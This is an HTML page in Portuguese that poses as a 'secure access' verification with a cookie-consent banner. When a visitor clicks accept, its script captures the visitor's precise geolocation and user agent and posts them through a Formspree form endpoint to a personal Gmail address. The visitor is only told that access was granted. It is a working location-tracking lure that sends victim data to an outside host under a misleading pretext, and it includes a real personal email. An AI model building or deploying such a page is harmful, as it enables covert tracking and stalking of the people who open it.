
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistema de Acesso Seguro</title>
    <style>
        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; background-color: #f0f2f5; }
        #cookie-banner { position: fixed; bottom: 0; width: 100%; background: #2c3e50; color: white; padding: 20px; text-align: center; z-index: 1000; }
        #cookie-banner button { background: #27ae60; border: none; padding: 10px 20px; color: white; cursor: pointer; font-weight: bold; border-radius: 5px; }
        #area-restrita { padding: 30px; border-radius: 15px; background: white; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; width: 90%; max-width: 400px; }
        .hidden { display: none !important; }
        .status { font-size: 0.9em; color: #666; margin-top: 10px; }
    </style>
</head>
<body>

    <div id="conteudo-inicial">
        <h1>🔐 Verificação Necessária</h1>
        <p>Aguardando validação de segurança...</p>
    </div>

    <!-- ÁREA QUE APARECE PARA O USUÁRIO -->
    <div id="area-restrita" class="hidden">
        <h2>Acesso Liberado</h2>
        <p>Sua localização foi registrada e o acesso foi permitido.</p>
        <div id="dados-usuario" style="font-family: monospace; background: #eee; padding: 10px; border-radius: 5px;"></div>
    </div>

    <!-- BANNER DE COOKIES -->
    <div id="cookie-banner">
        <span>Aceita os cookies e o compartilhamento de localização para prosseguir?</span>
        <button onclick="solicitarAcesso()">Aceitar e Entrar</button>
    </div>

    <script>
        function solicitarAcesso() {
            const banner = document.getElementById('cookie-banner');
            const statusTxt = document.querySelector('#conteudo-inicial p');
            
            banner.classList.add('hidden');
            statusTxt.innerText = "Validando sua localização...";

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const dados = {
                            email: "juliettemaverick244@gmail.com", // Seu e-mail
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            precisao: position.coords.accuracy + " metros",
                            timestamp: new Date().toLocaleString(),
                            userAgent: navigator.userAgent
                        };

                        // 1. Enviar os dados para o seu e-mail via Formspree
                        enviarParaEmail(dados);

                        // 2. Mostrar a área restrita para o usuário
                        document.getElementById('area-restrita').classList.remove('hidden');
                        document.getElementById('conteudo-inicial').classList.add('hidden');
                        document.getElementById('dados-usuario').innerHTML = 
                            `Lat: ${dados.latitude}<br>Long: ${dados.longitude}`;
                    },
                    (error) => {
                        alert("Erro: Você precisa permitir a localização para entrar.");
                        location.reload();
                    }
                );
            }
        }

        function enviarParaEmail(dados) {
            // Usando Formspree para enviar os dados
            fetch("https://formspree.io/f/xknkzjzo", { // ID temporário para o seu e-mail
                method: "POST",
                body: JSON.stringify(dados),
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                }
            }).then(response => {
                console.log("Dados enviados para o administrador.");
            });
        }
    </script>
</body>
</html>
